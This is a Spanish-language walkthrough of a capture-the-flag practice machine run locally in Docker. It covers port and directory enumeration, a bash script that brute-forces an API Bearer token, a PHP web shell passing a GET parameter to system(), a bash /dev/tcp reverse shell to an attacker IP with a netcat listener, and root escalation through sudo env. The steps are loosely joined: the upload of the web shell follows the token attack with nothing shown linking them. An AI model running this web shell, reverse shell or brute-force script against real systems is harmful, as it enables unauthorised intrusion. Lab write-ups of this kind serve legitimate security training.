
# 2. Máquina: Upload  

<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-purple.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** *🟡* *Fácil*

**Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*

**Fecha de creación:** *15/02/2025*

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de puertos](#escaneo-de-puertos-con-nmap)
- [3. Página principal](#visualización-de-la-página-principal)
- [4. Enumeración de directorios](#enumeración-de-directorios-con-gobuster)
- [5. Fuerza bruta](#fuerza-bruta)
- [6. Escalada de privilegios](#escalada-de-privilegios)

---

## Desplegando la Máquina Vulnerable

```python
~/ApiRooot ᐅ sudo bash auto_deploy.sh apiroot.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `apiroot.tar`.

**Salida:**

```python
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```python
~/ApiRoot ᐅ ping -c 2 172.17.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.17.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```python
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.177 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1025ms
rtt min/avg/max/mdev = 0.100/0.138/0.177/0.038 ms
```

---

## Escaneo de Puertos con Nmap

```python
~/ApiRoot ᐅ nmap -p- -sCV 172.17.0.2
```
Este comando revela que el puertos `22` (SSH) está abierto. También que el puert0 `5000` esta corriendo un servicio upnp (similar al wen http).

**Salida:**

```python
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 19:f1:08:79:13:c4:42:b8:6c:c8:a3:3e:f5:39:a3:59 (ECDSA)
|_  256 9b:93:02:4e:d2:08:f7:d7:eb:90:48:e4:48:17:1b:f5 (ED25519)
5000/tcp open  upnp
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Visualización de la página principal

- **http://172.17.0.2**

  Como se puede observar, la página de inicio es una página para el uso de una API

  ![image](https://github.com/user-attachments/assets/2eb61544-3169-4cf0-9f85-b5f5a0f5fa17)

---

## Enumeración de Directorios con Gobuster

```python
~/ApiRoot ᐅ gobuster dir --no-error -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://172.17.0.2:5000
```

**Salida:**

```python
...
/console              (Status: 400) [Size: 167]
...
```
**Explicación de parámetros:**

- `dir`: Modo de enumeración de directorios.
- `-w`: Especifica la wordlist a utilizar.
- `-u`: URL objetivo a escanear.
- `-t 200`: Define el número de hilos a usar (200 en este caso).
- `--no-error`: Oculta los errores emitidos por Gobuster.

#### **http://172.17.0.2:5000/console**

Como se puede observar nos arroja una BadRequest, y probando con otros métodos se obtiene el mismo resultado

![image](https://github.com/user-attachments/assets/5f23ace2-62d4-4c66-aeaf-56a0a3417fd9)

La página principal nos proporciona los ejemplos de uso de la API, la dirección `http://localhost:5000/api/directorio_oculto` es la más tentadora. Con `wfuzz` realizaremos un escaneo para averiguar si exixte un directorio oculto en la ruta `/api` del sitio
```python
~/ApiRoot ᐅ wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2:5000/api/FUZZ"
```

**Salida:**

```python
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000202:   401        3 L      5 W        31 Ch       "users" 
```
**Explicación de parámetros:**

- `-c`: Salida con color.
- `--hc`: Oculta en código de estado (404 en este caso).
- `-z`: Payload a utilizar acomañado de la wordlist.
- `-u`: Objetivo del ataque.

Suponiendo que `/users` es el directorio oculto, podemos utilizar el comando proporcionado en la guía de la API. Y como podemos ver, se puede acceder, pero sin autorización.
```python
~/ApiRoot ᐅ curl -H "Authorization: Bearer password_secreta" http://172.17.0.2:5000/api/users
```

**Salida:**

```python
{
  "error": "No autorizado"
}
```

---  

## Fuerza bruta 

Ahora que sabemos cual es el directorio oculto y un posible usuario, intentaremos hacer fuerza bruta con el comando `cURL` apoyandonos de un script de `bash`. El cual monstrará un mesnsaje exitoso si la contraseña es correcta. 
```bash
#!/bin/bash

URL="http://172.17.0.2:5000/api/users"
WORDLIST="/usr/share/seclists/Passwords/rockyou.txt"

while read -r token; do
    echo "Trying token: $token"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $token" "$URL")
    
    if [ "$response" -eq 200 ]; then
        echo "Success! Valid token found: $token"
        exit 0
    fi
done < "$WORDLIST"

echo "No valid token found."
exit 1
```
Si se ejecuta el script, se obtiene el siguiente resultado, en el que vemos las credenciales del usuario Bearer.
```python
Trying token: 123456
Trying token: 12345
Trying token: 123456789
Trying token: password
Trying token: iloveyou
Trying token: princess
Trying token: 1234567
Trying token: rockyou
Trying token: 12345678
Trying token: abc123
Trying token: nicole
Trying token: daniel
Trying token: babygirl
Trying token: monkey
Trying token: lovely
Trying token: jessica
Trying token: 654321
Trying token: michael
Trying token: ashley
Trying token: qwerty
Trying token: 111111
Trying token: iloveu
Trying token: 000000
Trying token: michelle
Trying token: tigger
Trying token: sunshine
Trying token: chocolate
Trying token: password1
Success! Valid token found: password1
```

## Escalada de privilegios.

En este caso, al tener acceso a la ruta en la que se alamacenan los archivos subidos, se puede intentar subir un archivo con extensión `.php`, el cual contendrá un script que permitirá la ejecución de una reverse shell.

El archivo que se subirá tendrá el nombre: reverse.php

### **Explicación de reverse.php**
```php
<?php
        system($_GET['rev']);
?>

```

- `<?php ... ?> ` :  Esto indica el inicio y el fin de un bloque de código.
- `system($_GET['rev']);` :  En esta línea ocurre la operación principal.
- `system()` :  Esta funcón ejecuta un comando directamente del sistema operativo y muestra la salida.
- `$_GET['rev']` :  $_GET es un array superglobal que recoge los datos enviados a través de la consulta de la URL (`?rev=comando`) usando el método GET. En este caso, está buscando un parámetro llamado `rev`. 

Antes de ponerlo a prueba, es necesario subir el script a el servidor.
  
 ![image](https://github.com/user-attachments/assets/d69ce36a-c297-452e-85de-ae09e618eb3a)

### **Ejemplo de uso de reverse.php**

**http://172.17.0.2/uploads/reverse.php?rev=whoami**

- `http://172.17.0.2/uploads/reverse.php`: Esta parte especifica la ubicación del archivo `reverse.php` en el servidor.
- `?rev=whoami`: Esto pasa el valor "whoami" a la variable `$_GET['rev']` en el archivo PHP. Este valor es el comando de linux que nos permite saber el nombre del usuario actual, si el funcionamiento del script es correcto, motrará un texto similar a `www-data` en el navegador, como se muestra en la imagen de abajo.

![image](https://github.com/user-attachments/assets/68eead14-ecc8-49c8-95e9-1cceb69883ea)

### **Ejecución de la reverse shell**

`http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`

- `bash -c`: Ejecuta el siguiente comando en una nueva instancia de bash. Esto permite aislar la ejecución del comando del entorno actual.
- `bash -i` :Ejecuta bash en modo interactivo. Esto crea una nueva sesión de shell interactiva, permitiendo al usuario ingresar comandos.
- `>%26`: Redirige tanto la salida estándar (stdout) como la entrada estándar de error (stderr) al dispositivo especificado.
- `/dev/tcp/192.168.1.100/6969`: Es un "archivo" especial en sistemas Linux que establece una conexión TCP a la dirección IP 192.168.1.100 en el puerto 6969. Toda la salida y los errores se envían a esta conexión. La IP cambiará en cada dispositivo, se puede comprobar con el comando `ifconfig` o `ip addr`.
- `0>%261`: Redirige la entrada estándar (stdin) de la shell a la misma conexión TCP. Esto permite una comunicación interactiva a través de la conexión de red.

#### Proceso:

- **Fase de Preparación**: El atacante inicia un listener en su máquina en el puerto 6969 utilizando el comando `nc -lvnp 6969` de la herramienta Netcat. Esto prepara la máquina atacante para recibir la conexión de la reverse shell.
  - `nc`: Esta es la abreviatura de "netcat", que se utiliza para leer y escribir datos a través de conexiones de red. 
  - `-l`: Indica a netcat que debe entrar en modo escucha, es decir, esperará conexiones entrantes en el puerto que se deseé.
  - `-v`: Activa el modo detallado. Muestra información adicional sobre la conexión, como la dirección IP y el puerto del cliente que se conecte.
  - `-n`: Evita la resolución de nombres de dominio. En lugar de intentar resolver el nombre de dominio asociado a una dirección IP, se utiliza directamente la dirección IP.
  - `-p 6969`: Esta opción especifica el número del puerto que se pondrá en escucha. 

```python
~/Upload ᐅ nc -lvnp 6969
listening on [any] 6969 ...
```

- **Ejecución**: Al acceder a la URL `http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`, el archivo `reverse.php` ejecuta el comando enviado a través del parámetro `rev`. Este comando inicia una conexión desde la máquina víctima a la máquina atacante.
```python
listening on [any] 6969 ...
connect to [192.168.1.100] from (UNKNOWN) [172.17.0.2] 41906
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c925d2eea10b:/var/www/html/uploads$
```

- **Resultado**: Una vez ejecutado el comando, la máquina víctima establece una conexión con la máquina atacante, permitiendo al atacante obtener una shell interactiva con el usuario `www-data`.
```python
www-data@c925d2eea10b:/var/www/html/uploads$ whoami
whoami
www-data
```

### **Acceso root**
#### Enumeración de Privilegios Sudo
```python
www-data@c925d2eea10b:/var/www/html/uploads$ sudo -l
 ```

Este comando muestra que el usuario `www-data` tiene permisos para ejecutar `env` con privilegios de superusuario.

**Salida:**

```python
sudo -l
Matching Defaults entries for www-data on c925d2eea10b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on c925d2eea10b:
    (root) NOPASSWD: /usr/bin/env
```

#### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>

```python
~/Upload ᐅ searchbins -b env -f sudo
```

Searchbins sugiere la técnica que se muestra en la salida para escalar privilegios utilizando `env` cuando se puede ejecutar como superusuario.

**Salida:**
```python

[+] Binary: env

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/env/#sudo]

        | sudo env /bin/sh
```

#### Ejecución de la Escalada de Privilegios

```python
www-data@c925d2eea10b:/var/www/html/uploads$ sudo env /bin/sh
```

Este comando utiliza `env` con privilegios de superusuario para ejecutar un shell con permisos de root.

**Comprobación:**
```python
sudo env /bin/sh
whoami
root
```


